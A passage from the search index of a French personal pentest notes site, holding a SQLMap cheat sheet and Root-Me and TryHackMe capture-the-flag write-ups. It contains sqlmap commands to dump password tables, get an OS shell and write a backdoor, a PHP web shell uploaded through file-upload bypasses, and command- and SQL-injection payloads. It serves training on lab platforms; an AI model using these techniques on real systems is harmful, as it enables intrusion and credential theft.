d'Informations","text":""},{"location":"Pentesting/Outils/SqlMAP/#lister-les-bases-de-donnees-disponibles","title":"Lister les bases de donn\u00e9es disponibles :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php?id=1\" --dbs\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/#lister-les-tables-dune-base-de-donnees-specifique","title":"Lister les tables d'une base de donn\u00e9es sp\u00e9cifique :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php?id=1\" -D database_name --tables\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/#lister-les-colonnes-dune-table-specifique","title":"Lister les colonnes d'une table sp\u00e9cifique :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php?id=1\" -D database_name -T table_name --columns\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/#extraire-le-contenu-dune-table","title":"Extraire le contenu d'une table :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php?id=1\" -D database_name -T table_name --dump\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/#exfiltration-de-donnees-sensibles","title":"\ud83d\udd11 Exfiltration de Donn\u00e9es Sensibles","text":""},{"location":"Pentesting/Outils/SqlMAP/#extraire-les-utilisateurs-et-mots-de-passe","title":"Extraire les utilisateurs et mots de passe :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php?id=1\" -D database_name -T users --dump\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/#extraire-uniquement-les-noms-dutilisateur","title":"Extraire uniquement les noms d'utilisateur :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php?id=1\" -D database_name -T users -C username --dump\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/#extraire-uniquement-les-mots-de-passe","title":"Extraire uniquement les mots de passe :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php?id=1\" -D database_name -T users -C password --dump\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/#prise-de-controle-et-execution-de-commandes","title":"\ud83d\udd25 Prise de Contr\u00f4le et Ex\u00e9cution de Commandes","text":""},{"location":"Pentesting/Outils/SqlMAP/#verifier-si-le-serveur-permet-lexecution-de-commandes","title":"V\u00e9rifier si le serveur permet l'ex\u00e9cution de commandes :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php?id=1\" --os-shell\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/#obtenir-un-shell-interactif","title":"Obtenir un shell interactif :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php?id=1\" --os-pwn\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/#lire-un-fichier-sensible-ex-etcpasswd","title":"Lire un fichier sensible (ex: /etc/passwd) :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php?id=1\" --file-read=\"/etc/passwd\"\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/#ecrire-un-fichier-sur-le-serveur","title":"\u00c9crire un fichier sur le serveur :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php?id=1\" --file-write=\"/var/www/html/backdoor.php\" --file-dest=\"/var/www/html/backdoor.php\"\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/#evasion-et-contournement","title":"\u2699\ufe0f \u00c9vasion et contournement","text":""},{"location":"Pentesting/Outils/SqlMAP/#utiliser-differents-niveaux-de-tests-plus-agressif","title":"Utiliser diff\u00e9rents niveaux de tests (plus agressif) :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php?id=1\" --level=5 --risk=3\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/#bypasser-un-waf","title":"Bypasser un WAF :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php?id=1\" --tamper=space2comment\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/#essayer-differentes-techniques-dinjection","title":"Essayer diff\u00e9rentes techniques d'injection :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php?id=1\" --technique=BEUST\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/#tester-si-la-connexion-est-authentifiee-avec-une-session","title":"Tester si la connexion est authentifi\u00e9e avec une session :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php?id=1\" --cookie=\"session=xyz\" --dbs\n</code></pre>"},{"location":"RootMe/","title":"\ud83d\udc80 Root-Me \u2013 Write-Ups","text":"<p>Bienvenue dans la section consacr\u00e9e \u00e0 mes r\u00e9solutions de challenges Root-Me.</p> <p>Root-Me est une plateforme CTF tr\u00e8s compl\u00e8te avec des centaines de d\u00e9fis class\u00e9s par th\u00e8me et difficult\u00e9.</p>"},{"location":"RootMe/#pourquoi-root-me","title":"\ud83d\udca1 Pourquoi Root-Me ?","text":"<ul> <li>\ud83c\udfaf Challenges techniques, souvent tr\u00e8s proches de la r\u00e9alit\u00e9</li> <li>\ud83d\udd13 Beaucoup d\u2019exploits \u201cold school\u201d et modernes</li> <li>\ud83d\udc68\u200d\ud83d\udcbb Id\u00e9al pour pratiquer le pentest web, reversing, forensics, crypto, etc.</li> </ul>"},{"location":"RootMe/#write-ups-disponibles","title":"\ud83d\udcc2 Write-Ups disponibles","text":"Challenge Type Lien Cryptanalyse Cryptographie \u2714\ufe0f Web Serveur Web \u2714\ufe0f ... ... ..."},{"location":"RootMe/#outils-utilises","title":"\ud83d\udd27 Outils utilis\u00e9s","text":"<ul> <li>\ud83e\uddea cURL, Burp Suite, ZAP Proxy</li> <li>\ud83d\udc0d Scripts Python personnalis\u00e9s</li> <li>\ud83d\udcdc Analyse de code source (lorsque dispo)</li> <li>\ud83d\ude80 bash, ffuf, etc.</li> </ul> <p>Ces write-ups sont fournis \u00e0 but p\u00e9dagogique uniquement. Je partage les techniques dans un cadre l\u00e9gal et \u00e9thique.</p>"},{"location":"RootMe/Cryptanalyse/","title":"\ud83d\udd10 Cryptanalyse \u2013 Write-Ups","text":"<p>Bienvenue dans la section cryptanalyse, o\u00f9 je documente la r\u00e9solution de challenges li\u00e9s \u00e0 la cryptographie :</p> <ul> <li>Substitution, chiffrement classique (Caesar, Vigen\u00e8re\u2026)</li> <li>XOR, Base64, Base32, rot13, etc.</li> <li>RSA, padding oracle, factorisation</li> <li>St\u00e9ganographie orient\u00e9e bits</li> <li>Et plus encore !</li> </ul>"},{"location":"RootMe/Cryptanalyse/#liste-des-challenges","title":"\ud83d\uddc2\ufe0f Liste des challenges","text":"Nom du challenge Type de chiffrement Lien Hash - DCC2 C\u00e9sar (shift simple) \u2714\ufe0f ... ... ..."},{"location":"RootMe/Cryptanalyse/#recommandations","title":"\ud83d\udccc Recommandations","text":"<ul> <li>Utilisez des outils comme <code>CyberChef</code>, <code>Cryptool</code>, <code>hash-identifier</code>, ou <code>gchq/CyberChef</code> en ligne.</li> <li>Essayez d\u2019automatiser les attaques via Python et la lib <code>pwntools</code> ou <code>sympy</code> pour RSA.</li> <li>Toujours v\u00e9rifier : encodage \u2260 chiffrement.</li> </ul>"},{"location":"RootMe/Cryptanalyse/#scripts-utiles","title":"\ud83d\udee0\ufe0f Scripts utiles","text":"<p>\ud83d\udcc1 <code>scripts/crypto/</code> \u2014 contient des snippets ou mini scripts pour : - D\u00e9tection automatique de chiffrements - Brute force de Vigen\u00e8re avec dictionnaire - Cracking RSA <code>n = p*q</code> faibles</p>"},{"location":"RootMe/Cryptanalyse/Hash%20-%20DCC2/Hash%20-%20DCC2/","title":"Hash   DCC2","text":""},{"location":"RootMe/Web%20Serveur/Web%20Serveur/","title":"Web Serveur","text":""},{"location":"RootMe/Web%20Serveur/Web%20Serveur/#html-code-source","title":"HTML Code Source","text":"<p>Inspecter l'\u00e9l\u00e9ment et Expand All, on peut voir deux commentaires HTML et \u00e0 l'int\u00e9rieur, nous avons le mot de passe !</p>"},{"location":"RootMe/Web%20Serveur/Web%20Serveur/#http-contournement-de-filtrage-ip","title":"HTTP - Contournement de Filtrage IP","text":"<p>En faisant la commande suivante, on indique dans la requ\u00eate que nous demandons l'acc\u00e8s \u00e0 la page depuis une adresse IP priv\u00e9 pour contourner la page de connexion : <pre><code>curl -H \"X-Forwarded-For: 10.0.0.1\" http://URL_DU_SITE\n</code></pre></p> <p>Et, nous avons maintenant le mot de passe !</p>"},{"location":"RootMe/Web%20Serveur/Web%20Serveur/#http-open-redirect","title":"HTTP - Open Redirect","text":"<p>En arrivant sur la page, on remarque qu'il n'y a seulement des liens de r\u00e9seaux sociaux disponibles comme Facebook, Twitter &amp; Slack. Sauf que ces liens, \u00e9crits en HTML, sont \u00e9crits sous forme suivante :</p> <p><pre><code>&lt;a href='?url=https://facebook.com&amp;h=a023cfbf5f1c39bdf8407f28b60cd134'&gt;facebook&lt;/a&gt;\n</code></pre> On peut voir que le lien prend l'url de la page actuelle et utilise deux params : - <code>url</code> : ce params corresponds \u00e0 l'url de destination - <code>h</code> : ce params corresponds au Hash en MD5 de l'url de de destination (en faisant une recherche sur le site Hashes, on peut voir l'algorithme de hash utilis\u00e9, et m\u00eame sa valeur de d\u00e9part\u2026) </p> <p>Donc, nous avons d\u00e9finir un nouveau lien qui emm\u00e8nera vers une autre page comme https://evil.com et que nous allons hasher en MD5 : <pre><code>echo -n \"https://evil.com\" | md5sum\n</code></pre></p> <p>Voici notre lien que nous allons donn\u00e9 au site web du challenge : <pre><code>?url=https://evil.com&amp;h=7a1eb5272a0de83226e7a50d14334056\n</code></pre></p> <p>Avant de le renseigner dans le navigateur, on doit d\u00e9sactiver le javascript de notre navigateur : Sur Kali Linux, on a Firefox et si on va dans l'onglet <code>about:config</code>, on fait passer cette valeur \u00e0 <code>false</code> : <pre><code>javascript.enabled                                  false\n</code></pre></p> <p>Une fois fait, nous avons bien une nouvelle page qui s'affiche o\u00f9 on peut trouver le mot de passe !</p>"},{"location":"RootMe/Web%20Serveur/Web%20Serveur/#http-user-agent","title":"HTTP - User Agent","text":"<p>En faisant la commande suivante, on indique dans la requ\u00eate que nous demandons l'acc\u00e8s \u00e0 la page avec un user agent appel\u00e9 <code>admin</code> pour contourner la page : <pre><code>curl -A \"admin\" http://URL_DU_SITE\n</code></pre></p> <p>Et, nous avons maintenant le mot de passe ! </p>"},{"location":"RootMe/Web%20Serveur/Web%20Serveur/#mot-de-passe-faible","title":"Mot de passe faible","text":"<p>Rien \u00e0 dire : Identifiant : <code>admin</code> / Mot de passe : <code>admin</code></p>"},{"location":"RootMe/Web%20Serveur/Web%20Serveur/#php-injection-de-commande","title":"PHP - Injection de Commande","text":"<p>On nous indique que nous devons lire le contenu du fichier <code>index.php</code>.</p> <p>Nous avons un site avec un input pour renseigner une adresse IP que le serveur va <code>ping</code> et afficher le r\u00e9sultat sur la page. Alors, on indique qu'on veut faire le ping, puis ex\u00e9cuter la commande suivante pour afficher le contenu du fichier : <pre><code>127.0.0.1 ; php -s index.php\n</code></pre> Le s\u00e9parateur <code>;</code> nous permet d'ex\u00e9cuter une autre commande et nous avons utilis\u00e9 <code>php -s</code> pour faire afficher en sortie la syntaxe HTML avec le code PHP surlign\u00e9.</p> <p>On peut voir la variable $flag suivante, qui nous parle d'un fichier <code>.passwd</code> : <pre><code>$flag = \"\".file_get_contents(\".passwd\").\"\";\n</code></pre></p> <p>Donc, nous avons besoin de faire afficher le contenu du fichier avec la commande suivante : <pre><code>127.0.0.1 ; cat .passwd\n</code></pre></p> <p>Et, nous obtenons le mot de passe !</p>"},{"location":"RootMe/Web%20Serveur/Web%20Serveur/#fichier-de-sauvegarde","title":"Fichier de sauvegarde","text":"<p>Nous avons une page de login et l'indication de fichier de sauvegarde. Nous devons trouver l'extension de fichier de sauvegarde de notre page de connexion : - <code>.bak</code> - <code>.old</code>  - <code>.~</code> et celui qui est pr\u00e9sent, a le nom <code>index.php~</code>. On l'affiche avec curl : <pre><code>curl http://URL_DU_SITE/index.php~\n</code></pre></p> <p>Et, on obtient les identifiants de connexion !</p>"},{"location":"RootMe/Web%20Serveur/Web%20Serveur/#directory-indexing","title":"Directory Indexing","text":"<p>Nous arrivons devant une page blanche. Analysons alors le code et on trouve le commentaire suivant :  <pre><code>include(\"admin/pass.html\")\n</code></pre></p> <p>Allons voir le contenu de ce fichier, et nous sommes tomb\u00e9s dans le pi\u00e8ge du d\u00e9veloppeur.  <pre><code>http://URL_DU_SITE/admin/pass.html\n</code></pre></p> <p>Pour autant, ce pi\u00e8ge nous indique qu'il y a bien un dossier <code>admin</code>, allons plut\u00f4t voir la page index\u00e9 au dossier : un <code>Index of /</code> !</p> <pre><code>http://URL_DU_SITE/admin/\n</code></pre> <p>Nous pouvons voir gr\u00e2ce a cette page, les diff\u00e9rents fichiers ou dossiers pr\u00e9sents dans le dossier <code>admin</code>, et nous avons un dossier <code>backup</code> avec le fichier <code>admin.txt</code> :  <pre><code>http://URL_DU_SITE/admin/backup/admin.txt\n</code></pre></p> <p>Et, nous obtenons le mot de passe :</p>"},{"location":"RootMe/Web%20Serveur/Web%20Serveur/#http-headers","title":"HTTP Headers","text":"<p>Cette indice nous indique que nous allons manipuler le <code>header</code>, ou \"en-t\u00eate\" en fran\u00e7ais, de notre requ\u00eate vers la page pour avoir l'acc\u00e8s admin.</p> <p>Il est possible d'utiliser Burp Suite mais curl fera l'affaire et avec plusieurs tentatives, voici le seul Header qui a march\u00e9 : <pre><code>curl -H \"Header-RootMe-Admin: admin\" http://URL_DU_SITE\n</code></pre></p> <p>Et, nous avons le mot de passe !</p>"},{"location":"RootMe/Web%20Serveur/Web%20Serveur/#http-post","title":"HTTP - POST","text":"<p>Nous avons un jeu compl\u00e8tement injuste o\u00f9 nous devons d\u00e9pass\u00e9 le score de <code>999999</code> du d\u00e9veloppeur... Ici, nous devons trouver un moyen de modifier notre score pour qu'il d\u00e9passe celui du d\u00e9veloppeur, sans faire de multiples tentatives sur le site. (Oui, on va tricher !)</p> <p>Pour cela, on va utiliser <code>Burp Suite</code>, qui va se plac\u00e9 en tant que Proxy, en interm\u00e9diaire entre notre navigateur client et le serveur, et qui va pouvoir intercepter notre requ\u00eate et permettre de la modifier.</p> <p>Tout d'abord, nous allons dans les param\u00e8tres de notre Navigateur et nous indiquons l'adresse IP du Proxy (Burp), qui est par d\u00e9faut : <code>127.0.0.1:8080</code>.</p> <p>On ouvre maintenant Burp, dans l'onglet Proxy et Intercept, puis on clique pour avoir <code>Intercept is on</code>. Puis, on fais une tentative du jeu depuis notre navigateur, de retour sur Burp, on peut voir notre requ\u00eate avec le <code>query</code> score :</p> <pre><code>score=623530&amp;generate=Give+a+try%21\nscore=1000000000000000000000&amp;generate=Give+a+try%21\n</code></pre> <p>On d\u00e9finit un score arbitrairement plus grand que <code>999999</code> et on clique sur <code>Forward</code>, pour envoyer notre requ\u00eate au serveur.  Et, on obtient le mot de passe !</p>"},{"location":"RootMe/Web%20Serveur/Web%20Serveur/#http-redirection-invalide","title":"HTTP - Redirection invalide","text":"<p>Nous arrivons devant une page de connexion et ayant pour indice de trouver un moyen d'afficher la page index.php et de ne pas utiliser notre navigateur web.</p> <p>Nous allons devoir utiliser curl pour afficher le contenu de la page index.php, avec la commande suivante : <pre><code>curl http://URL_DU_SITE/index.php\n</code></pre></p> <p>Et, nous avons le mot de passe !</p> <p>Dans cet exercice, le navigateur web a pour fonctionnement d'effectuer chaque redirection que le serveur lui demande sans r\u00e9fl\u00e9chir, d'o\u00f9 l'indice.</p> <p>Avec curl, si nous le pr\u00e9cisons pas, il ne fait pas de redirection automatique ! C'est ainsi que nous pu voir le contenu de page <code>index.php</code> alors que son code pr\u00e9cise bien une redirection vers la page <code>login.php</code> \u00e9tant donne que nous ne sommes pas connect\u00e9.</p> <p>Le d\u00e9veloppeur pr\u00e9cise justement que le probl\u00e8me \u00e9tait d\u00fb au manque de l'instruction <code>exit()</code> apr\u00e8s l'instruction de redirection en PHP <code>header('Location: ...')</code>, qui fait que PHP renvois le contenu de la page.</p>"},{"location":"RootMe/Web%20Serveur/Web%20Serveur/#http-verb-tampering","title":"HTTP - Verb tampering","text":"<p>Nous avons une alert qui nous demande de nous connecter pour acc\u00e9der \u00e0 la page, le navigateur ne nous serviras pas ici encore. L'indice nous indique que nous pouvons contourner les m\u00e9canismes de s\u00e9curit\u00e9 en manipulant les requ\u00eates HTTP. Pour cela, nous allons utiliser curl et utiliser les differentes m\u00e9thodes de requ\u00eates HTTP : - GET - POST - PUT - DELETE</p> <p>Les m\u00e9thodes GET et POST ont \u00e9t\u00e9 bloques mais pas PUT et DELETE.  Voici les commandes curl suivantes :  <pre><code>curl -X PUT http://URL_DU_SITE/\ncurl -X DELETE http://URL_DU_SITE/\n</code></pre></p> <p>Et, on obtient le mot de passe !</p>"},{"location":"RootMe/Web%20Serveur/Web%20Serveur/#install-files","title":"Install files","text":"<p>Nous avons une page blanche, en inspectant le code, nous avons seulement un commentaire nous indiquant l'existante du dossier <code>/phpbb</code>, comme pr\u00e9ciser dans l'indice. Il nous dit aussi qu'il n'a pas fini de l'installer alors on va chercher ces fichier d'installation.</p> <p>En cherchant, on tombe sur un dossier <code>/install</code>. En y allant, on tombe sur  un <code>Index of /</code> avec le fichier <code>install.php</code>! On clique dessus et le script PHP s'ex\u00e9cute, et on a le mot de passe !</p> <p>Comme pr\u00e9ciser par le d\u00e9veloppeur, cette faille est du a l'oubli de supprimer les fichiers d'installation de PHPBB, ce qui nous permet dans un cas r\u00e9el, de r\u00e9initialiser le forum et de changer tous les mot de passes car on le r\u00e9installe !</p>"},{"location":"RootMe/Web%20Serveur/Web%20Serveur/#file-upload-double-extensions","title":"File Upload - Double extensions","text":"<p>Nous arrivons sur un site avec plusieurs pages en liens avec des photos (\u00e9motes, app, devices, cat\u00e9gories, etc.) mais il y a un lien int\u00e9ressant, c'est celui de <code>upload</code> o\u00f9 l'on peut faire t\u00e9l\u00e9charger au serveur des images sous format <code>.gif</code>, <code>.jpg</code> et <code>.png</code>.</p> <p>Le but est de faire t\u00e9l\u00e9charger un code php qui nous permettent d'afficher le fichier <code>.passwd</code> \u00e0 la racine, ce qui est notamment pr\u00e9ciser en indice du d\u00e9fi.</p> <p>Il indique \"Double extensions\", en recherchant sur Internet, je trouve que les fichiers <code>.php</code> peuvent \u00eatre convertit en <code>.php.jpg</code> ou autre, et toujours fonctionner ! </p> <p>J'ai \u00e9crit et uploade ce code PHP qui permet d'ex\u00e9cuter des commandes <code>shell</code> depuis l'url en m\u00e9thode GET avec le params <code>cmd</code> : <pre><code>&lt;?php\nerror_reporting(E_ALL);\nini_set('display_errors', 1);\nif (isset($_REQUEST['cmd'])) {\n    echo \"&lt;pre&gt;\" . system($_REQUEST['cmd']) . \"&lt;/pre&gt;\";\n}\n?&gt;\n</code></pre></p> <pre><code>http://URL_DU_SITE/galerie/upload/97e70afeabcafb72cdc02329879ca861/shell.php.jpg\n</code></pre> <p>Une fois upload, on doit ajouter dans l'url le params cmd et de commencer pour se rep\u00e9rer, \u00e0 faire la commande ls -la pour lister les \u00e9l\u00e9ments presents dans le dossier actuelle : <pre><code>?cmd=ls la\n</code></pre></p> <p>On peux voir notre code shell mais nous devons trouver la racine o\u00f9 se trouve le fichier <code>.passwd</code> et que l'on trouve ici : <pre><code>?cmd=ls la ../../../\n</code></pre></p> <p>On utilise cat pour l'afficher et on a le mot de passe ! <pre><code>?cmd=cat ../../../.passwd\n</code></pre></p>"},{"location":"RootMe/Web%20Serveur/Web%20Serveur/#file-upload-type-mime","title":"File Upload - Type MIME","text":"<p>Nous arrivons sur un site avec plusieurs pages en liens avec des photos (\u00e9motes, app, devices, cat\u00e9gories, etc.) mais il y a un lien int\u00e9ressant, c'est celui de <code>upload</code> o\u00f9 l'on peut faire t\u00e9l\u00e9charger au serveur des images sous format <code>.gif</code>, <code>.jpg</code> et <code>.png</code>.</p> <p>Le but est de faire t\u00e9l\u00e9charger un code PHP qui nous permettent d'afficher le fichier <code>.passwd</code> \u00e0 la racine, ce qui est notamment pr\u00e9ciser en indice du d\u00e9fi.</p> <p>J'ai \u00e9crit et uploade ce code PHP qui permet d'ex\u00e9cuter des commandes <code>shell</code> depuis l'url en m\u00e9thode GET avec le params <code>cmd</code> : <pre><code>&lt;?php\nerror_reporting(E_ALL);\nini_set('display_errors', 1);\nif (isset($_REQUEST['cmd'])) {\n    echo \"&lt;pre&gt;\" . system($_REQUEST['cmd']) . \"&lt;/pre&gt;\";\n}\n?&gt;\n</code></pre></p> <p>Cette fois-ci, le serveur web affiche l'image avec la balise HTML <code>&lt;img&gt;</code> le fichier upload\u00e9 car il a l'extension <code>.jpg</code>, ce qui provoque \u00e9videmment une erreur d'affichage et un blocage de l'ex\u00e9cution du fichier PHP. </p> <p>On doit alors forcer le t\u00e9l\u00e9chargement du fichier avec son extension <code>.php</code>, sauf que le Javascript du Site web nous bloque avec les extensions <code>.gif</code>, <code>.jpg</code> et <code>.png</code> uniquement. </p> <p>La solution est d'utiliser <code>Burp Suite</code>, qui va se plac\u00e9 en tant que Proxy, en interm\u00e9diaire entre notre navigateur client et le serveur, et qui va pouvoir intercepter notre requ\u00eate et permettre de la modifier.</p> <p>Tout d'abord, nous allons dans les param\u00e8tres de notre Navigateur et nous indiquons l'adresse IP du Proxy (Burp), qui est par d\u00e9faut : <code>127.0.0.1:8080</code>.</p> <p>On ouvre maintenant Burp, dans l'onglet Proxy et Intercept, puis on clique pour avoir <code>Intercept is on</code>. Puis, on upload le fichier en <code>.php.jpg</code> depuis notre navigateur, de retour sur Burp, on peut voir notre requ\u00eate avec le nom du fichier avec l'extension <code>.php.jpg</code>. </p> <p>On renomme le fichier en <code>.php</code> et on clique sur <code>Forward</code>, pour envoyer notre requ\u00eate au serveur. Et, le fichier a bien \u00e9t\u00e9 upload\u00e9 sur le serveur : <pre><code>http://URL_DU_SITE/galerie/upload/437h893h84h03u48/shell.php\n</code></pre></p> <p>Une fois upload\u00e9, on doit ajouter dans l'url le params <code>cmd</code> et de commencer pour se rep\u00e9rer, \u00e0 faire la commande ls -la pour lister les \u00e9l\u00e9ments pr\u00e9sents dans le dossier actuelle : <pre><code>?cmd=ls -la\n</code></pre></p> <p>On peux voir notre code shell mais nous devons trouver la racine o\u00f9 se trouve le fichier <code>.passwd</code> et que l'on trouve ici : <pre><code>?cmd=ls -la ../../../\n</code></pre></p> <p>On utilise cat pour l'afficher et on a le mot de passe ! <pre><code>?cmd=cat ../../../.passwd\n</code></pre></p>"},{"location":"TryHackMe/","title":"\u2694\ufe0f TryHackMe \u2013 Write-Ups","text":"<p>Bienvenue sur la section d\u00e9di\u00e9e \u00e0 mes write-ups TryHackMe.</p> <p>TryHackMe est une plateforme d\u2019apprentissage en cybers\u00e9curit\u00e9 proposant des environnements interactifs pour progresser en pentest, r\u00e9seaux, reverse engineering, et bien plus.</p>"},{"location":"TryHackMe/#objectifs","title":"\ud83d\udccc Objectifs","text":"<ul> <li>\ud83d\udcda Apprendre de nouvelles techniques offensive/d\u00e9fensive</li> <li>\ud83e\uddea Exp\u00e9rimenter dans des environnements virtuels isol\u00e9s</li> <li>\ud83e\uddf1 Consolider ses bases pour OSCP / certifications</li> <li>\ud83e\udde0 Comprendre l\u2019approche \u201cattacker mindset\u201d</li> </ul>"},{"location":"TryHackMe/#write-ups-disponibles","title":"\ud83d\uddc2\ufe0f Write-Ups disponibles","text":"Machine / Room Cat\u00e9gorie Difficult\u00e9 Lien Boiler CTF Pentest - CTF Medium \u2714\ufe0f Injection SQL Lab Lab Facile \u2714\ufe0f Publisher CTF Pentest - CTF Facile \u2714\ufe0f Rabbit store Pentest - CTF Medium \u2714\ufe0f ... ... ... ... <p>\u2728 Cette liste est \u00e9volutive, et je l\u2019enrichirai au fil de mes progr\u00e8s.</p>"},{"location":"TryHackMe/#recommandations","title":"\ud83d\udd0e Recommandations","text":"<ul> <li>Utilisez Burp, nmap, Enum4linux, LinPEAS, Gobuster, John.</li> <li>Documentez chaque \u00e9tape : <code>recon</code>, <code>exploit</code>, <code>post-exploit</code>.</li> <li>N'h\u00e9sitez pas \u00e0 refaire les rooms avec des contraintes suppl\u00e9mentaires (no Metasploit, par ex).</li> </ul>"},{"location":"TryHackMe/Boiler%20CTF/Boiler%20CTF%20-%20TryHackMe/","title":"Boiler CTF   TryHackMe","text":"<p>https://tryhackme.com/room/boilerctf2</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"TryHackMe/Injection%20SQL%20Lab/Injection%20SQL%20-%20TryHackMe/","title":"Injection SQL   TryHackMe","text":"<p>https://tryhackme.com/room/sqlilab</p> <p>This room, SQL Injection Lab, is meant as an introduction to\u00a0SQL\u00a0injection and demonstrates various\u00a0SQL\u00a0injection attacks. It is not meant as a way to learn the\u00a0SQL\u00a0language itself. Some previous knowledge of the\u00a0SQL\u00a0language is highly recommended.</p>"},{"location":"TryHackMe/Injection%20SQL%20Lab/Injection%20SQL%20-%20TryHackMe/#injection-1-input-box-non-string","title":"Injection 1 : Input Box Non-String","text":"<pre><code>1\u00a0or\u00a01=1-- -\n</code></pre> <p>FLAG :</p> <p></p>"},{"location":"TryHackMe/Injection%20SQL%20Lab/Injection%20SQL%20-%20TryHackMe/#injection-2-input-box-string","title":"Injection 2 : Input Box String","text":"<pre><code>1'\u00a0or\u00a0'1'='1'-- -\n</code></pre> <p>FLAG :</p> <p></p>"},{"location":"TryHackMe/Injection%20SQL%20Lab/Injection%20SQL%20-%20TryHackMe/#injection-3-url-injection","title":"Injection 3 : URL Injection","text":"<p>FLAG :</p> <p></p>"},{"location":"TryHackMe/Injection%20SQL%20Lab/Injection%20SQL%20-%20TryHackMe/#injection-4-post-injection","title":"Injection 4 : POST Injection","text":"<p>FLAG :</p> <p></p>"},{"location":"TryHackMe/Injection%20SQL%20Lab/Injection%20SQL%20-%20TryHackMe/#injection-5-update-statement","title":"Injection 5 : UPDATE Statement","text":"<ul> <li>Pr\u00e9alable :</li> </ul> <pre><code>',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='\n</code></pre> <p>FLAG :</p> <p></p>"},{"location":"TryHackMe/Publisher%20CTF/Publisher%20CTF%20-%20TryHackMe/","title":"Publisher CTF   TryHackMe","text":"<p>https://tryhackme.com/room/publisher</p>"},{"location":"TryHackMe/Publisher%20CTF/Publisher%20CTF%20-%20TryHackMe/#nmap","title":"Nmap","text":"<p>Pour faire une premi\u00e8re prise d'information, Nmap est tr\u00e8s utile pour savoir quels port sur la machine cible est ouvert et utilis\u00e9 par quels services.</p> <p>Voici ma commande Nmap avec les options d\u00e9taill\u00e9es : - <code>-sC</code> : activer les scripts Nmap Scripting Engine (NSE) s\u00fbrs et utiles pour la d\u00e9tection de version, la d\u00e9couverte d'informations suppl\u00e9mentaires sur les services, et la v\u00e9rification de certaines vuln\u00e9rabilit\u00e9s courantes. - <code>-sV</code> : Active la d\u00e9tection de version. - <code>-oA</code> : Sauvegarder le r\u00e9sultat du scan initial fait par Nmap, en trois types de fichiers possibles (XML, Nmap et GNmap)</p> <p><pre><code>nmap -sC -sV -oA initial_scan &lt;IP-cible&gt;\n</code></pre> </p> <p></p> <p>Nous remarquons deux choses importantes, il y a un serveur SSH allum\u00e9 et qu'il y a un serveur web Apache d'allum\u00e9 : le serveur web est le seul exploitable actuellement.</p> <p></p>"},{"location":"TryHackMe/Publisher%20CTF/Publisher%20CTF%20-%20TryHackMe/#gobuster","title":"Gobuster","text":"<p>Etant donn\u00e9 que nous avons un serveur web, avec une page statique, il faut d\u00e9couvrir s'il y a un d'autres fichiers ou dossier pr\u00e9sents sur le serveur. Gobuster est un programme qui va nous \u00eatre utile pour brute force le serveur de requ\u00eates HTTP avec des noms de fichiers commun\u00e9ment utilis\u00e9s, pr\u00e9sents dans la wordlist <code>common.txt</code> : <pre><code>gobuster dir -u http://&lt;IP-cible&gt; -w /usr/share/wordlists/dirb/common.txt\n</code></pre> </p> <p></p> <p>Nous d\u00e9couvrons un dossier <code>/images</code> mais ils contient simplement les images statiques de la page : </p> <p>Je r\u00e9essaye avec une deuxi\u00e8me wordlist plus compl\u00e8te, <code>big.txt</code>, et qui va trouver un dossier <code>/spip</code> : <pre><code>gobuster dir -u http://&lt;IP-cible&gt; -w /usr/share/wordlists/dirb/big.txt\n</code></pre> </p> <p></p> <p></p> <p>Avec un peu plus de recul, il \u00e9tait possible de comprendre d\u00e8s la page \u00e0 la racine, que le serveur web utilisait le service SPIP\u00a0(Syst\u00e8me de publication pour l'Internet) est un logiciel libre\u00a0destin\u00e9 \u00e0 la production de\u00a0sites web.</p> <p>Mais bon, maintenant que nous avons bien compris \u00e7a, il faut trouver sa version, car nous voulons savoir si SPIP pr\u00e9sente une faille que nous pourrions exploiter, en recherchant sur le site d'Exploit-db.</p> <p>Il a plusieurs mani\u00e8res de le savoir mais pour moi, c'est la commande <code>curl</code> qu'il me l'a donn\u00e9 : </p>"},{"location":"TryHackMe/Publisher%20CTF/Publisher%20CTF%20-%20TryHackMe/#rce","title":"RCE","text":"<p>Apr\u00e8s avoir pris l'information de la version de SPIP, je suis all\u00e9 chercher sur Exploit-db s'il y avait une faille renseign\u00e9 et il y a une faille renseign\u00e9 sous la CVE suivante : CVE-2023-27372.  Nous avons remarqu\u00e9 que SPIP sur sa version 4.2 et sur cette version, il y a une faille qui permet une RCE (Remote Command Execution) cela via des valeurs de formulaire dans la zone publique car la s\u00e9rialisation est mal g\u00e9r\u00e9e, sans avoir besoin d'\u00eatre connect\u00e9. La vuln\u00e9rabilit\u00e9 RCE 